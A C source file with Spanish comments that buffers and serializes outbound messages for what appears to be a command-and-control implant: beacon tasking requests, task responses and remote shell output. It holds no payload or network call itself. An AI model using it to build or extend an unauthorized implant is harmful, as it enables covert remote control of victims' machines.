#include "outbound.h"

#include <stdlib.h>
#include <string.h>

#include "packer.h"

static Outbound g_out;

// 1 si count > 0
int out_have_data() {
    return g_out.count;
}

void out_reset(void) {
    g_out.len=0;
    g_out.count=0;
    // data se deja igual porque se reutiliza
}

// aumenta el buffer si es necesario
static int out_ensure(size_t extra) {
    if (g_out.len + extra <= g_out.cap) return 0;
    size_t newcap = g_out.cap ? g_out.cap : OUTBOUND_INITIAL_CAP;
    while (newcap < g_out.len + extra) newcap *= 2;
    uint8_t* p = (uint8_t*)realloc(g_out.data, newcap);
    if (!p) return -1;
    g_out.data = p;
    g_out.cap  = newcap;
    return 0;
}

// rellena header, devuelve data, aloca un data nuevo vacio para el proximo beacon
uint8_t* out_take(size_t* total_len) {   // [A2][count][mensajes]
    size_t total = 1 + 4 + g_out.len;
    uint8_t* body = (uint8_t*)malloc(total);
    if (!body) { *total_len = 0; return NULL; }
    size_t off = 0;
    pack_byte(body, &off, MSG_GET_TASKING); // header [A2]
    pack_u32(body, &off, g_out.count); // count real
    memcpy(body + off, g_out.data, g_out.len); // mensajes
    off += g_out.len;
    *total_len = off;
    g_out.len = 0; g_out.count = 0;
    return body; // main lo libera tras el POST
}

// append de un bloque data
void out_add_raw(const uint8_t* data, size_t n) {
    if (!data || n == 0) return;
    if (out_ensure(n) != 0) return;
    memcpy(g_out.data + g_out.len, data, n); // append
    g_out.len += n;
    g_out.count++; // cuenta como un mensaje
}

// serializa un 0xA4 (usa pack_task_response) y hace append
void out_add_task_response(const char* uuid, const uint8_t* data, size_t n, uint8_t status) {
    size_t need = 1 + 36 + 4 + n + 1; // tipo + uuid + (4+len) + status
    if (out_ensure(need) != 0) return;
    size_t off = g_out.len; // append
    pack_byte(g_out.data, &off, MSG_TASK_RESPONSE);
    memcpy(g_out.data + off, uuid, 36); off += 36;
    pack_bytes(g_out.data, &off, data, n);
    pack_byte(g_out.data, &off, status);
    g_out.len = off;
    g_out.count++;
}

// serializa [0xDA][task_uuid(36)][message_type(1)][len(4)][data] y hace append
void out_add_shell_data(const char* task_uuid, uint8_t message_type, const uint8_t* data, size_t n) {
    size_t need = 1 + 36 + 1 + 4 + n;
    if (out_ensure(need) != 0) return;
    size_t off = g_out.len; //append
    pack_byte(g_out.data, &off, MSG_SHELL_DATA);
    memcpy(g_out.data + off, task_uuid, 36); off += 36;
    pack_byte(g_out.data, &off, message_type);
    pack_bytes(g_out.data, &off, data, n);
    g_out.len = off;
    g_out.count++;
}

